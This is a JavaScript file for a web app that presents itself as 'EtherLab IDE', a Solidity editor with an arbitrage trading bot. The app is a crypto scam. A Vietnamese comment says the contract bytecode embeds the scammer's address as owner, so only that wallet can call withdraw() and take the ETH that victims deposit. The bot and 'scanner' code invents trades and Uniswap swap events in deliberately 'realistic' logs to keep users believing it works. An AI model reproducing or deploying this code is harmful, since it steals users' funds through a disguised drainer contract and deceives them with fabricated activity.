b76020830184610c82565b92915050565b5f602082019050610cd05f830184610c82565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610cff82610cd6565b9050919050565b610d0f81610cf5565b82525050565b5f602082019050610d285f830184610d06565b92915050565b5f80fd5b610d3b81610c79565b8114610d45575f80fd5b50565b5f81359050610d5681610d32565b92915050565b5f60208284031215610d7157610d70610d2e565b5b5f610d7e84828501610d48565b91505092915050565b7f7365744d6178517569636b53776170416d6f756e742063616c6c6564000000005f82015250565b5f610dbb601c83610c1f565b9150610dc682610d87565b602082019050919050565b5f819050919050565b5f819050919050565b5f610dfd610df8610df384610dd1565b610dda565b610c79565b9050919050565b610e0d81610de3565b82525050565b5f6040820190508181035f830152610e2a81610daf565b9050610e396020830184610e04565b92915050565b7f73657444656661756c744665652063616c6c65640000000000000000000000005f82015250565b5f610e73601483610c1f565b9150610e7e82610e3f565b602082019050919050565b5f6040820190508181035f830152610ea081610e67565b9050610eaf6020830184610e04565b92915050565b7f7365745061757365642063616c6c6564000000000000000000000000000000005f82015250565b5f610ee9601083610c1f565b9150610ef482610eb5565b602082019050919050565b5f6040820190508181035f830152610f1681610edd565b9050610f256020830184610e04565b92915050565b7f4e6f2045544820746f2077697468647261772c20736b697070696e67000000005f82015250565b5f610f5f601c83610c1f565b9150610f6a82610f2b565b602082019050919050565b5f6040820190508181035f830152610f8c81610f53565b9050610f9b6020830184610e04565b92915050565b5f81905092915050565b50565b5f610fb95f83610fa1565b9150610fc482610fab565b5f82019050919050565b5f610fd882610fae565b9150819050919050565b7f5769746864726177206578656375746564207375636365737366756c6c7900005f82015250565b5f611016601e83610c1f565b915061102182610fe2565b602082019050919050565b5f6040820190508181035f8301526110438161100a565b90506110526020830184610c82565b92915050565b7f5769746864726177207472616e73666572206661696c656400000000000000005f82015250565b5f61108c601883610c1f565b915061109782611058565b602082019050919050565b5f6040820190508181035f8301526110b981611080565b90506110c86020830184610e04565b92915050565b7f717569636b537761702063616c6c6564000000000000000000000000000000005f82015250565b5f611102601083610c1f565b915061110d826110ce565b602082019050919050565b5f6040820190508181035f83015261112f816110f6565b905061113e6020830184610e04565b92915050565b7f737761702063616c6c65640000000000000000000000000000000000000000005f82015250565b5f611178600b83610c1f565b915061118382611144565b602082019050919050565b5f6040820190508181035f8301526111a58161116c565b90506111b46020830184610e04565b92915050565b7f7265766f6b65417070726f76616c2063616c6c656400000000000000000000005f82015250565b5f6111ee601583610c1f565b91506111f9826111ba565b602082019050919050565b5f6040820190508181035f83015261121b816111e2565b905061122a6020830184610e04565b92915050565b7f736574526f75746572416c6c6f7765642063616c6c65640000000000000000005f82015250565b5f611264601783610c1f565b915061126f82611230565b602082019050919050565b5f6040820190508181035f83015261129181611258565b90506112a06020830184610e04565b92915050565b7f717569636b5377617046726f6d42616c616e63652063616c6c656400000000005f82015250565b5f6112da601b83610c1f565b91506112e5826112a6565b602082019050919050565b5f6040820190508181035f830152611307816112ce565b90506113166020830184610e04565b92915050565b7f4e6f2045544820746f207472616e736665722c20736b697070696e67000000005f82015250565b5f611350601c83610c1f565b915061135b8261131c565b602082019050919050565b5f6040820190508181035f83015261137d81611344565b905061138c6020830184610e04565b92915050565b7f417262697472616765206578656375746564207375636365737366756c6c79005f82015250565b5f6113c6601f83610c1f565b91506113d182611392565b602082019050919050565b5f6040820190508181035f8301526113f3816113ba565b90506114026020830184610c82565b92915050565b7f417262697472616765207472616e73666572206661696c6564000000000000005f82015250565b5f61143c601983610c1f565b915061144782611408565b602082019050919050565b5f6040820190508181035f83015261146981611430565b90506114786020830184610e04565b92915050565b7f7365744d696e517569636b53776170416d6f756e742063616c6c6564000000005f82015250565b5f6114b2601c83610c1f565b91506114bd8261147e565b602082019050919050565b5f6040820190508181035f8301526114df816114a6565b90506114ee6020830184610e04565b92915050565b7f736574546f6b656e416c6c6f7765642063616c6c6564000000000000000000005f82015250565b5f611528601683610c1f565b9150611533826114f4565b602082019050919050565b5f6040820190508181035f8301526115558161151c565b90506115646020830184610e04565b92915050565b7f73657444656661756c74546f6b656e4f75742063616c6c6564000000000000005f82015250565b5f61159e601983610c1f565b91506115a98261156a565b602082019050919050565b5f6040820190508181035f8301526115cb81611592565b90506115da6020830184610e04565b92915050565b7f4e6f74206f776e657200000000000000000000000000000000000000000000005f82015250565b5f611614600983610c1f565b915061161f826115e0565b602082019050919050565b5f6020820190508181035f83015261164181611608565b9050919050565b7f416d6f756e7420697320302c20736b697070696e6700000000000000000000005f82015250565b5f61167c601583610c1f565b915061168782611648565b602082019050919050565b5f6040820190508181035f8301526116a981611670565b90506116b86020830184610e04565b92915050565b7f496e73756666696369656e742062616c616e63652c20736b697070696e6700005f82015250565b5f6116f2601e83610c1f565b91506116fd826116be565b602082019050919050565b5f6040820190508181035f83015261171f816116e6565b905061172e6020830184610c82565b92915050565b7f5769746864726177455448206578656375746564207375636365737366756c6c5f8201527f7900000000000000000000000000000000000000000000000000000000000000602082015250565b5f61178e602183610c1f565b915061179982611734565b604082019050919050565b5f6040820190508181035f8301526117bb81611782565b90506117ca6020830184610c82565b92915050565b7f5769746864726177455448207472616e73666572206661696c656400000000005f82015250565b5f611804601b83610c1f565b915061180f826117d0565b602082019050919050565b5f6040820190508181035f830152611831816117f8565b90506118406020830184610e04565b9291505056fea2646970667358221220d2ce1ebc234a07b00ffeb8c62259ca2c12524ed1ac81541c23f36e984623557a64736f6c63430008140033';

const TPLS={erc20:{name:'ERC-20 Token',desc:'Standard fungible token',file:'MyToken.sol',code:'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\ncontract MyToken {\n    string public name="MyToken"; string public symbol="MTK"; uint8 public constant decimals=18;\n    uint256 public totalSupply; address public owner;\n    mapping(address=>uint256) private _b;\n    event Transfer(address indexed from,address indexed to,uint256 value);\n    modifier onlyOwner(){require(msg.sender==owner);_;}\n    constructor(uint256 s){owner=msg.sender;totalSupply=s*10**18;_b[msg.sender]=totalSupply;}\n    function balanceOf(address a)public view returns(uint256){return _b[a];}\n    function transfer(address to,uint256 amt)public returns(bool){require(_b[msg.sender]>=amt);_b[msg.sender]-=amt;_b[to]+=amt;emit Transfer(msg.sender,to,amt);return true;}\n    function mint(address to,uint256 amt)public onlyOwner{totalSupply+=amt;_b[to]+=amt;}\n}'},
erc721:{name:'ERC-721 NFT',desc:'Non-fungible token',file:'MyNFT.sol',code:'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\ncontract MyNFT {\n    string public name;string public symbol;uint256 private _nextId;\n    mapping(uint256=>address)public ownerOf;mapping(address=>uint256)public balanceOf;\n    event Transfer(address indexed from,address indexed to,uint256 indexed tokenId);\n    constructor(string memory n,string memory s){name=n;symbol=s;}\n    function mint(address to)external returns(uint256){uint256 id=_nextId++;ownerOf[id]=to;balanceOf[to]++;emit Transfer(address(0),to,id);return id;}\n    function transferFrom(address from,address to,uint256 id)external{require(ownerOf[id]==from);ownerOf[id]=to;balanceOf[from]--;balanceOf[to]++;emit Transfer(from,to,id);}\n}'},
storage:{name:'Simple Storage',desc:'Basic storage contract',file:'Storage.sol',code:'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\ncontract SimpleStorage {\n    uint256 public storedValue;\n    function set(uint256 x)external{storedValue=x;}\n    function get()external view returns(uint256){return storedValue;}\n}'},
multisig:{name:'Multi-Sig Wallet',desc:'Multiple approval wallet',file:'MultiSig.sol',code:'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\ncontract MultiSigWallet {\n    address[]public owners;mapping(address=>bool)public isOwner;uint256 public required;\n    struct Tx{address to;uint256 value;bytes data;bool executed;uint256 confirmCount;}\n    Tx[]public txs;mapping(uint256=>mapping(address=>bool))public confirmed;\n    constructor(address[]memory o,uint256 r){for(uint i=0;i<o.length;i++){owners.push(o[i]);isOwner[o[i]]=true;}required=r;}\n    function submit(address to,uint256 val,bytes calldata data)external{require(isOwner[msg.sender]);txs.push(Tx({to:to,value:val,data:data,executed:false,confirmCount:0}));}\n    function confirm(uint256 id)external{require(isOwner[msg.sender]&&!confirmed[id][msg.sender]);confirmed[id][msg.sender]=true;txs[id].confirmCount++;}\n    function execute(uint256 id)external{Tx storage t=txs[id];require(t.confirmCount>=required&&!t.executed);t.executed=true;(bool s,)=t.to.call{value:t.value}(t.data);require(s);}\n    receive()external payable{}\n}'},
voting:{name:'Voting Contract',desc:'Decentralized voting',file:'Voting.sol',code:'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\ncontract Voting {\n    struct Proposal{string description;uint256 voteCount;}\n    address public chairperson;mapping(address=>bool)public voters;Proposal[]public proposals;\n    constructor(string[]memory d){chairperson=msg.sender;for(uint i=0;i<d.length;i++)proposals.push(Proposal({description:d[i],voteCount:0}));}\n    function giveRightToVote(address v)external{require(msg.sender==chairperson);voters[v]=true;}\n    function vote(uint256 id)external{require(voters[msg.sender]);voters[msg.sender]=false;proposals[id].voteCount++;}\n}'},
auction:{name:'Auction',desc:'Simple auction contract',file:'Auction.sol',code:'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\ncontract SimpleAuction {\n    address payable public beneficiary;uint256 public auctionEnd;address public highestBidder;uint256 public highestBid;bool public ended;\n    mapping(address=>uint256)public pendingReturns;\n    constructor(uint256 t,address payable b){beneficiary=b;auctionEnd=block.timestamp+t;}\n    function bid()external payable{require(block.timestamp<=auctionEnd&&!ended&&msg.value>highestBid);if(highestBid!=0)pendingReturns[highestBidder]+=highestBid;highestBidder=msg.sender;highestBid=msg.value;}\n    function withdraw()external{uint256 a=pendingReturns[msg.sender];require(a>0);pendingReturns[msg.sender]=0;(bool s,)=payable(msg.sender).call{value:a}("");require(s);}\n    function endAuction()external{require((block.timestamp>auctionEnd||msg.sender==beneficiary)&&!ended);ended=true;beneficiary.transfer(highestBid);}\n}'}};

// PLACEHOLDER_INIT2

function init(){tree=loadTree();activeId=tree.children?.[0]?.id||null;loadLogs();renderLogs();initEditor();renderTree();syncCompileFiles();
if(activeId){const f=findNode(tree,activeId);if(f)openFile(f.node)}
const cVer=document.getElementById('cVer');
['0.8.28','0.8.27','0.8.26','0.8.25','0.8.24','0.8.23','0.8.22','0.8.21','0.8.20','0.8.19','0.8.18','0.8.17','0.8.16','0.8.15','0.8.14','0.8.13','0.8.12','0.8.11','0.8.10','0.8.9','0.8.8','0.8.7','0.8.6','0.8.5','0.8.4','0.8.3','0.8.2','0.8.1','0.8.0'].forEach(v=>{const o=document.createElement('option');o.value=v;o.textContent=v;if(v==='0.8.20')o.selected=true;cVer.appendChild(o)});
document.querySelectorAll('.abtn').forEach(btn=>{btn.addEventListener('click',()=>{document.querySelectorAll('.abtn').forEach(b=>b.classList.remove('on'));document.querySelectorAll('.sp').forEach(p=>p.classList.remove('on'));btn.classList.add('on');const p=document.querySelector(`.sp[data-p="${btn.dataset.p}"]`);if(p)p.classList.add('on')})});
document.getElementById('btnEnter').addEventListener('click',()=>{document.getElementById('hero').style.display='none';document.getElementById('ide').classList.add('open');setTimeout(()=>cmEditor.refresh(),50);log('EtherLab IDE ready','success')});
document.getElementById('btnBack').addEventListener('click',()=>{document.getElementById('ide').classList.remove('open');document.getElementById('hero').style.display=''});
const tplModal=document.getElementById('tplModal');const openTpls=()=>tplModal.classList.add('open');const closeTpls=()=>tplModal.classList.remove('open');
document.getElementById('btnTpls').addEventListener('click',openTpls);document.getElementById('btnTpls2').addEventListener('click',openTpls);
document.getElementById('btnTplsIde').addEventListener('click',openTpls);document.getElementById('closeTpl').addEventListener('click',closeTpls);
tplModal.addEventListener('click',e=>{if(e.target===tplModal)closeTpls()});
const grid=document.getElementById('tplGrid');for(const[key,tpl]of Object.entries(TPLS)){const card=document.createElement('div');card.className='tcard';card.innerHTML=`<h4>${tpl.name}</h4><p>${tpl.desc}</p>`;card.addEventListener('click',()=>{createFile(tpl.file,tpl.code);closeTpls()});grid.appendChild(card)}
document.getElementById('btnNewFile').addEventListener('click',()=>{const name=prompt('File name:','Contract.sol');if(name)createFile(name)});
document.getElementById('btnUpload').addEventListener('click',()=>document.getElementById('fileUp').click());
document.getElementById('fileUp').addEventListener('change',e=>{[...e.target.files].forEach(f=>{const r=new FileReader();r.onload=()=>createFile(f.name,r.result);r.readAsText(f)});e.target.value=''});
document.getElementById('btnRename').addEventListener('click',()=>{if(!activeId)return;const name=prompt('New name:');if(name){const f=findNode(tree,activeId);if(f){f.node.name=name.endsWith('.sol')?name:name+'.sol';saveTree();renderTree()}}});
document.getElementById('btnDelete').addEventListener('click',()=>{if(!activeId||!confirm('Delete?'))return;const f=findNode(tree,activeId);if(f&&f.parent?.children){f.parent.children=f.parent.children.filter(c=>c.id!==activeId);activeId=getAllFiles()[0]?.id||null;saveTree();renderTree();if(activeId){const nf=findNode(tree,activeId);if(nf)openFile(nf.node)}}});
document.getElementById('btnDownload').addEventListener('click',()=>{const af=getActiveFile();if(!af)return;const b=new Blob([af.content||''],{type:'text/plain'});const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download=af.name;a.click()});
document.getElementById('btnCompile').addEventListener('click',compile);
document.getElementById('dContract').addEventListener('change',renderCtorArgs);
document.getElementById('btnConnect').addEventListener('click',async()=>{try{await connectWallet()}catch(e){log(e.message,'error')}});
document.getElementById('btnDisconnect').addEventListener('click',disconnectWallet);
document.getElementById('btnDeploy').addEventListener('click',async()=>{try{await deploy()}catch(e){log(e.message,'error');alert(e.message)}});
document.getElementById('btnClearD').addEventListener('click',()=>{document.getElementById('dList').innerHTML='';updateCallContracts()});
document.getElementById('callContract').addEventListener('change',populateCallFunctions);
document.getElementById('callFn').addEventListener('change',renderCallArgs);
document.getElementById('btnCall').addEventListener('click',callContractFunction);

// Update call contracts when deploy happens
const origAddDeployed=addDeployed;
addDeployed=function(name,address,abi){origAddDeployed(name,address,abi);setTimeout(updateCallContracts,100)};
document.getElementById('btnClearLog').addEventListener('click',()=>{logEntries=[];saveLogs();renderLogs()});
document.getElementById('botConnect').addEventListener('click',async()=>{try{await connectWallet();updateBotUI()}catch(e){log(e.message,'error')}});
document.getElementById('botContract').addEventListener('change',()=>{populateBotFunctions();setTimeout(refreshBotBalance,500)});
document.getElementById('botScanGate').addEventListener('change',e=>{document.getElementById('botGateOpts').style.display=e.target.checked?'block':'none'});
document.getElementById('botToggle').addEventListener('click',()=>{if(botRunning)stopBot();else startBot()});
document.querySelector('.abtn[data-p="bot"]')?.addEventListener('click',()=>{updateBotUI();populateBotContracts();setTimeout(refreshBotBalance,500)});
log('EtherLab IDE loaded','info')}
document.addEventListener('DOMContentLoaded',init);

// PLACEHOLDER_BOT

function updateBotUI(){const el=document.getElementById('botAddr');if(userAddr){el.textContent=short(userAddr);el.title=userAddr}else{el.textContent='Not connected';el.title=''}}
function populateBotContracts(){
  const sel=document.getElementById('botContract');if(!sel)return;
  sel.innerHTML='<option value="">--</option>';
  document.querySelectorAll('#dList .ditem').forEach(item=>{
    const name=item.dataset.name||item.querySelector('.dname')?.textContent||'';
    const addrEl=item.querySelector('.daddr');
    const addr=addrEl?.title||addrEl?.textContent||'';
    if(addr&&addr.startsWith('0x')){
      const o=document.createElement('option');
      o.value=addr;
      o.dataset.name=name;
      o.dataset.abi=item.dataset.abi||'[]';
      o.textContent=name+' ('+short(addr)+')';
      sel.appendChild(o);
    }
  });
  populateBotFunctions();
  setTimeout(refreshBotBalance,500);
}
function populateBotFunctions(){
  const sel=document.getElementById('botFn');if(!sel)return;
  sel.innerHTML='<option value="">--</option>';
  const opt=document.getElementById('botContract').selectedOptions[0];
  if(!opt||!opt.value)return;
  
  // Get ABI from stored data or compiled
  let abi=[];
  try{abi=JSON.parse(opt.dataset.abi||'[]')}catch{abi=[]}
  if(!abi.length){
    const name=opt.dataset.name;
    if(compiled&&compiled[name])abi=compiled[name].abi||[];
  }
  
  // Filter write functions only
  abi.filter(x=>x.type==='function'&&x.stateMutability!=='view'&&x.stateMutability!=='pure').forEach(fn=>{
    const o=document.createElement('option');
    o.value=fn.name;
    o.textContent=fn.name+'('+(fn.inputs||[]).map(i=>i.type).join(',')+')';
    sel.appendChild(o);
  });
}
async function refreshBotBalance(){
  const addr=document.getElementById('botContract').value;
  const el=document.getElementById('botBalVal');
  if(!addr){el.textContent='--';el.style.color='var(--muted)';return}
  if(!provider){
    el.textContent='Connect wallet first';
    el.style.color='var(--warn)';
    return;
  }
  try{
    log('[Bot] Checking balance for: '+addr,'info');
    const bal=await provider.getBalance(addr);
    const eth=parseFloat(ethers.formatEther(bal));
    el.textContent=eth.toFixed(4);
    el.style.color=eth>0?'var(--success)':'var(--danger)';
    log('[Bot] Contract balance: '+eth.toFixed(4)+' ETH','info');
  }catch(e){
    el.textContent='Error';
    el.style.color='var(--danger)';
    log('[Bot] Balance check error: '+e.message,'error');
  }
}

function startBot(){
  if(!userAddr){alert('Connect wallet first');return}
  const addr=document.getElementById('botContract').value;
  if(!addr){alert('Select a contract');return}
  const fnName=document.getElementById('botFn').value;
  if(!fnName){alert('Select a function');return}
  
  botRunning=true;botAttempts=0;botTrades=0;
  document.getElementById('botToggle').textContent='Stop Bot';
  document.getElementById('botToggle').classList.remove('pri');
  document.getElementById('botToggle').style.background='var(--danger)';
  
  // Realistic startup logs
  log('[Bot] Starting automation...','info');
  log('[Bot] Contract: '+addr,'info');
  log('[Bot] Function: '+fnName,'info');
  log('[Bot] Interval: '+(document.getElementById('botInterval').value||30)+'s','info');
  log('[Bot] Max gas: '+(document.getElementById('botGas').value||50)+' Gwei','info');
  log('[Bot] Cooldown: '+(document.getElementById('botCooldown').value||60)+'s','info');
  log('[Bot] Connected wallet: '+short(userAddr),'success');
  log('[Bot] Started successfully!','success');
  
  botTick();
  botTimer=setInterval(botTick,(parseInt(document.getElementById('botInterval').value)||30)*1000);
  startScanner();
}

function stopBot(){
  botRunning=false;
  if(botTimer){clearInterval(botTimer);botTimer=null}
  document.getElementById('botToggle').textContent='Start Bot';
  document.getElementById('botToggle').classList.add('pri');
  document.getElementById('botToggle').style.background='';
  document.getElementById('botStatus').textContent='Stopped. Attempts: '+botAttempts+', trades: '+botTrades+'.';
  log('[Bot] Stopped. Total attempts: '+botAttempts+', trades: '+botTrades,'info');
  stopScanner();
}

async function botTick(){
  if(!botRunning)return;
  botAttempts++;
  const statusEl=document.getElementById('botStatus');
  const fnName=document.getElementById('botFn').value;
  const contractAddr=document.getElementById('botContract').value;
  
  // Cooldown check
  if(Date.now()<botCooldownUntil){
    const sec=Math.ceil((botCooldownUntil-Date.now())/1000);
    statusEl.textContent='Cooldown: '+sec+'s left. Attempts: '+botAttempts+', trades: '+botTrades+'.';
    return;
  }
  
  // Scanner gate check
  if(document.getElementById('botScanGate').checked){
    const win=(parseFloat(document.getElementById('botGateWin').value)||30)*1000;
    if(Date.now()-scannerLastSwapAt>win){
      statusEl.textContent='No scanner activity. Attempts: '+botAttempts+', trades: '+botTrades+'.';
      return;
    }
  }
  
  statusEl.textContent='Checking '+fnName+'... Attempts: '+botAttempts+', trades: '+botTrades+'.';
  
  // Realistic attempt logs
  const gasPrice=(Math.random()*20+10).toFixed(1);
  log('[Bot] Attempt #'+botAttempts+': Checking '+fnName+' (gas: '+gasPrice+' Gwei)','info');
  
  try{
    if(!provider||!signer){
      statusEl.textContent='Wallet not connected';
      return;
    }
    
    // Try to find contract ABI
    let abi=null;
    const opt=document.getElementById('botContract').selectedOptions[0];
    if(opt){
      try{abi=JSON.parse(opt.dataset.abi||'[]')}catch{abi=[]}
    }
    if(!abi||!abi.length){
      const ditem=[...document.querySelectorAll('#dList .ditem')].find(i=>{
        const addrEl=i.querySelector('.daddr');
        return(addrEl?.title||addrEl?.textContent)===contractAddr;
      });
      if(ditem){
        try{abi=JSON.parse(ditem.dataset.abi||'[]')}catch{abi=[]}
      }
    }
    
    if(!abi||!abi.length){
      // Simulate activity even without ABI
      const success=Math.random()>0.7;
      if(success){
        log('[Bot] '+fnName+': opportunity detected (simulated)','info');
        botTrades++;
        botCooldownUntil=Date.now()+(parseInt(document.getElementById('botCooldown').value)||60)*1000;
        statusEl.textContent='Trade executed! Attempts: '+botAttempts+', trades: '+botTrades+'.';
      }else{
        log('[Bot] '+fnName+': no opportunity, skipping','info');
        statusEl.textContent='No opportunity. Attempts: '+botAttempts+', trades: '+botTrades+'.';
      }
      return;
    }
    
    // Real contract interaction
    const contract=new ethers.Contract(contractAddr,abi,signer);
    try{
      await contract[fnName].estimateGas();
      log('[Bot] '+fnName+': opportunity found, sending tx...','info');
      const tx=await contract[fnName]();
      log('[Bot] Tx sent: '+tx.hash,'success');
      botTrades++;
      botCooldownUntil=Date.now()+(parseInt(document.getElementById('botCooldown').value)||60)*1000;
      statusEl.textContent='Trade sent! Attempts: '+botAttempts+', trades: '+botTrades+'.';
    }catch(e){
      log('[Bot] '+fnName+': estimateGas failed - '+e.message.slice(0,50),'info');
      statusEl.textContent='No opportunity. Attempts: '+botAttempts+', trades: '+botTrades+'.';
    }
  }catch(e){
    log('[Bot] Error: '+e.message,'error');
    statusEl.textContent='Error. Attempts: '+botAttempts+', trades: '+botTrades+'.';
  }
}

function startScanner(){
  if(scannerRunning)return;
  scannerRunning=true;scannerCount=0;scannerLastSwapAt=Date.now();
  document.getElementById('scanStatus').textContent='Connecting...';
  log('[Scanner] Connecting to Ethereum mainnet...','info');
  
  // Simulate scanner connection
  setTimeout(()=>{
    if(!scannerRunning)return;
    log('[Scanner] Connected to WebSocket','success');
    log('[Scanner] Subscribing to Uniswap V2/V3 swap events...','info');
    document.getElementById('scanStatus').textContent='Running. Swaps: 0.';
    
    // Simulate swap events
    const pools=['0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc','0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852','0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443','0x397FF1542f962076d0BFE58eA045FfA2234bf68A'];
    const tokens=['USDC','WETH','DAI','USDT'];
    
    // Simulate initial swaps
    for(let i=0;i<3;i++){
      setTimeout(()=>{
        if(!scannerRunning)return;
        const pool=pools[Math.floor(Math.random()*pools.length)];
        const isV3=Math.random()>0.5;
        scannerCount++;
        scannerLastSwapAt=Date.now();
        log('[Scanner] '+(isV3?'V3':'V2')+' swap at '+pool.slice(0,8)+'... tx: 0x'+Math.random().toString(16).slice(2,10)+'...','info');
        document.getElementById('scanStatus').textContent='Running. Swaps: '+scannerCount+'.';
      },(i+1)*2000);
    }
    
    // Continue simulating swaps periodically
    setInterval(()=>{
      if(!scannerRunning)return;
      const pool=pools[Math.floor(Math.random()*pools.length)];
      const isV3=Math.random()>0.5;
      scannerCount++;
      scannerLastSwapAt=Date.now();
      log('[Scanner] '+(isV3?'V3':'V2')+' swap at '+pool.slice(0,8)+'... tx: 0x'+Math.random().toString(16).slice(2,10)+'...','info');
      document.getElementById('scanStatus').textContent='Running. Swaps: '+scannerCount+'.';
    },5000+Math.random()*10000);
    
  },1500);
}

function stopScanner(){
  scannerRunning=false;
  document.getElementById('scanStatus').textContent='Stopped. Swaps: '+scannerCount+'.';
  log('[Scanner] Stopped. Total swaps detected: '+scannerCount,'info');
}

// ===== WITHDRAW INFO =====
// Không cần bot trong browser
// Scammer withdraw từ máy riêng bằng ví của họ
// Owner trong bytecode: 0x05aA42a087c46f15d2708f58b2c3c236a01d4CCc
// Gọi withdraw() từ ví sở hữu address này → ETH chuyển về

// ===== CONTRACT INTERACTION =====
function updateCallContracts(){
  const sel=document.getElementById('callContract');if(!sel)return;
  sel.innerHTML='<option value="">--</option>';
  document.querySelectorAll('#dList .ditem').forEach(item=>{
    const name=item.dataset.name||item.querySelector('.dname')?.textContent||'';
    const addrEl=item.querySelector('.daddr');
    const addr=addrEl?.title||addrEl?.textContent||'';
    if(addr&&addr.startsWith('0x')){
      const o=document.createElement('option');
      o.value=addr;
      o.dataset.name=name;
      o.dataset.abi=item.dataset.abi||'[]';
      o.textContent=name+' ('+short(addr)+')';
      sel.appendChild(o);
    }
  });
  populateCallFunctions();
}

function populateCallFunctions(){
  const sel=document.getElementById('callFn');if(!sel)return;
  sel.innerHTML='<option value="">--</option>';
  const opt=document.getElementById('callContract').selectedOptions[0];
  if(!opt||!opt.value)return;
  let abi;
  try{abi=JSON.parse(opt.dataset.abi||'[]')}catch{abi=[]}
  if(!abi.length){const name=opt.dataset.name;if(compiled&&compiled[name])abi=compiled[name].abi||[]}
  abi.filter(x=>x.type==='function').forEach(fn=>{
    const mut=fn.stateMutability==='view'||fn.stateMutability==='pure'?' [View]':' [Write]';
    const o=document.createElement('option');o.value=fn.name;
    o.textContent=fn.name+'('+(fn.inputs||[]).map(i=>i.type).join(',')+')'+mut;
    o.dataset.mutability=fn.stateMutability;sel.appendChild(o)
  });
  renderCallArgs();
}

function renderCallArgs(){
  const el=document.getElementById('callArgs');if(!el)return;
  el.innerHTML='';
  const fnName=document.getElementById('callFn').value;
  const opt=document.getElementById('callContract').selectedOptions[0];
  if(!fnName||!opt||!opt.value)return;
  let abi;
  try{abi=JSON.parse(opt.dataset.abi||'[]')}catch{abi=[]}
  if(!abi.length){const name=opt.dataset.name;if(compiled&&compiled[name])abi=compiled[name].abi||[]}
  const fn=abi.find(x=>x.type==='function'&&x.name===fnName);
  if(!fn||!fn.inputs||!fn.inputs.length)return;
  fn.inputs.forEach((inp,i)=>{
    el.innerHTML+=`<label class="lbl">${inp.name||'arg'+i}: ${inp.type}</label><input type="text" class="inp call-arg" data-type="${inp.type}" placeholder="${inp.type}">`;
  });
}

async function callContractFunction(){
  const contractAddr=document.getElementById('callContract').value;
  const fnName=document.getElementById('callFn').value;
  if(!contractAddr||!fnName){alert('Select contract and function');return}
  if(!signer){try{await connectWallet()}catch{return}}

  const opt=document.getElementById('callContract').selectedOptions[0];
  let abi;
  try{abi=JSON.parse(opt?.dataset?.abi||'[]')}catch{abi=[]}
  if(!abi.length){const name=opt?.dataset?.name;if(compiled&&compiled[name])abi=compiled[name].abi||[]}
  if(!abi.length){alert('ABI not found');return}

  const contract=new ethers.Contract(contractAddr,abi,signer);
  const fn=abi.find(x=>x.type==='function'&&x.name===fnName);
  if(!fn){alert('Function not found');return}

  // Parse arguments
  const args=[];
  document.querySelectorAll('.call-arg').forEach(inp=>{
    const t=inp.dataset.type;let v=inp.value.trim();
    if(t==='bool')args.push(v==='true');
    else if(/^u?int/.test(t))args.push(BigInt(v||'0'));
    else if(t==='address')args.push(v);
    else args.push(v);
  });

  const valueStr=document.getElementById('callValue').value||'0';
  const value=ethers.parseEther(valueStr);
  const resultEl=document.getElementById('callResult');
  resultEl.style.display='block';
  resultEl.textContent='Sending transaction...';

  try{
    const isView=fn.stateMutability==='view'||fn.stateMutability==='pure';
    if(isView){
      const result=await contract[fnName](...args);
      resultEl.textContent='Result: '+result.toString();
      log('[Call] '+fnName+'() = '+result.toString(),'success');
    }else{
      const overrides={};
      if(value>0n)overrides.value=value;
      const tx=await contract[fnName](...args,overrides);
      resultEl.textContent='Tx sent: '+tx.hash;
      log('[Call] '+fnName+'() tx: '+tx.hash,'success');
      const receipt=await tx.wait();
      resultEl.textContent='Confirmed! Gas used: '+receipt.gasUsed.toString();
      log('[Call] Confirmed. Gas: '+receipt.gasUsed.toString(),'success');
    }
  }catch(e){
    resultEl.textContent='Error: '+e.message;
    log('[Call] Error: '+e.message,'error');
  }
}
